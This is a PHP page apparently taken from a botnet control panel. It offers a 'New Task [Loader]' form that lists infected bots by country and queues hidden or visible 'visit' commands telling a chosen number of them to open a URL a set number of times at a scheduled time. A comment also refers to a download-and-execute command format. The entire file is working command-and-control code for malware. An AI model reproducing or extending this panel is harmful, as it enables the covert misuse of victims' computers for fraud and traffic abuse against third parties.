<?php require_once('../inc/session.php'); require_once('../inc/config.php'); require_once('../other/safe.php'); require_once('../other/rechte.php'); rechte_abfragen('visit'); ?>

<script type="text/javascript">
function add(text){
    var tb = document.getElementById("countries");
    tb.value = tb.value + text;
}
</script>

<script type="text/javascript">
function check(){
	if(document.getElementById("countries").value == ""){
		return(confirm("no country selected. OK?"));
	}
}
</script>

<link rel="stylesheet" type="text/css" href="../css/style.css"/>
<link rel="stylesheet" type="text/css" href="../css/tasks.css"/>

<body onunload="opener.location.reload();">

<?php
function get_top20($limit){
$query1 = mysql_query("SELECT COUNT(*) AS count FROM bots");
				
while($row = mysql_fetch_array($query1)){
	$alle = $row[count];
}

if($limit){
	$query2 = mysql_query("SELECT * FROM bots GROUP BY country HAVING count(country) >= 1 ORDER BY count(country) DESC LIMIT 0,10");
}else{
	$query2 = mysql_query("SELECT * FROM bots GROUP BY country HAVING count(country) >= 1 ORDER BY count(country) DESC LIMIT 10,20");
}

$array = array();

while($row = mysql_fetch_array($query2)){
	$country = safe_xss($row['country']);
	$query3  = mysql_query("SELECT COUNT(*) AS count FROM bots WHERE country = '".safe_sql($country)."'");
													
	while($row = mysql_fetch_array($query3)){
		$zahl = safe_xss($row['count']);
								
		array_push($array,$zahl);

		$gesamt = $alle;
		$total  = safe_xss($zahl/$gesamt*100);
							
		if(!empty($country)){
			$countries .= '<label style="display: inline-block; width: 2em;"><img src="../img/flags/'.safe_xss($country).'.gif" OnClick="add(\''.safe_xss($country).',\');" /></label>';
		}
	}
};

return $countries;
}

	echo '<div id="title">New Task [Loader]</div>
		  <div id="content">
			<form action="visit.php" method="post">
				<label for="url">URL:</label><input type="text" name="url" id="url" class="box" /> (with http//)<br /><br />
				<label for="mode">Ausf&uuml;hren:</label><input type="text" name="mode" value="1" id="mode" class="box" /> (1 = hide, 0 = normal)<br /><br />
				<label for="visits">Aufrufe:</label><input type="text" name="visits" id="visits" class="box" /> (with http//)<br /><br />
				
				<label for="top20"><b id="top20">Top 20</b></label>'.get_top20(1).'<br />
				<label for="top20"><b id="top20">      </b></label>'.get_top20(0).' (click on the flags)<br /> <br />
				<label for="countries">Countries:</label><input type="text" name="countries" id="countries" class="box" /> (empty = all)<br /><br />		
			
				<label for="count">Count:</label><input type="text" name="count" id="count" class="box" /> (e.g.: 100)<br /><br />
				<label for="execute">Execute date:</label><input type="text" value="'.date('Y-m-d H:i:s').'" name="execute" id="execute" class="box" /> (Y-m-d H:i:s)<br /><br />
				
				<p align="center"><input type="submit" name="add" value="add & close" class="button" OnClick="return check();" /></p>
			</form>
		  </div>';
		  
	if(isset($_POST['add'])){
		$url 	   = safe_xss($_POST['url']);
		$mode	   = safe_xss($_POST['mode']);
		$visits	   = safe_xss($_POST['visits']);
		$countries = safe_xss($_POST['countries']);
		$count     = safe_xss($_POST['count']);
		$execute   = safe_xss($_POST['execute']);

		$cmd = "[visit]*".$url."*".$mode."*".$visits.'*'; //[dlex]*hwid*url*speicher-name*mode 

		if(empty($url) || empty($count) || empty($execute)){
			echo '<script>alert("Error - Empty fields found");</script>';
		}else{		
			mysql_query("INSERT INTO tasks (command, countries, time, bots) VALUES ('".safe_sql($cmd)."', '".safe_sql($countries)."', '".safe_sql($execute)."', '".safe_sql($count)."')");
			echo '<script>alert("Successfully added");parent.close();</script>';
		}
	}
?>